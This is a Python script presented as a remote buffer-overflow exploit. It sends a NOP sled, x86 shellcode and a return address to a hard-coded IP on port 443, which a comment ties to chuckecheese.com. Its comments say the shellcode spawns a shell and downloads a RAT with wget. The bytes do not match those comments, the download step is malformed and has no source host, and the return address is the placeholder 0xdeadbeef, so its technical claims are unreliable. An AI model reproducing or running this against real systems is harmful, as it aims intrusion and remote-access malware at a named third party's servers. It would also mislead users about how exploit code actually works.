import socket
import struct

# Example shellcode to download and execute a RAT
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  # Push "/bin//sh" onto the stack
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"              # Execve syscall to spawn a shell
    b"\x31\xc0\x50\x68\x2e\x2f\x72\x61\x74\x89\xe3\x50\x68"  # Push "./rat" (the RAT filename)
    b"\x2f\x2f\x77\x67\x89\xe3\x50\x68\x6e\x2f\x77\x67\x89"  # Push "wget" (the downloader command)
    b"\xe1\x50\x89\xe2\x50\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80"  # Execve syscall to download the RAT
)

# List of target IP addresses with default port 443
target_ips = [
    "13.89.113.79" #chuckecheese.com master of all servers
]

# Connect to the vulnerable server
def connect_to_target(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

# Send the payload with the overflow and shellcode
def send_payload(socket):
    # Assume the buffer size is 1024 bytes, adjust accordingly
    buffer_size = 1024

    # Create the payload with NOP sled, shellcode, and return address (targeted overflow)
    nop_sled = b"\x90" * (buffer_size - len(shellcode))
    ret_address = struct.pack("<I", 0xdeadbeef)  # Example return address, adjust as needed
    payload = nop_sled + shellcode + ret_address

    # Send the payload
    socket.send(payload)

# Main function to execute the exploit
def main():
    default_port = 443  # Set the default port

    for ip in target_ips:
        try:
            print(f"Connecting to {ip}:{default_port}...")
            s = connect_to_target(ip, default_port)
            print(f"Sending payload to {ip}:{default_port}...")
            send_payload(s)
            s.close()
            print(f"Payload sent successfully to {ip}:{default_port}.\n")
        except Exception as e:
            print(f"Failed to exploit {ip}:{default_port}: {e}\n")

if __name__ == "__main__":
    main()
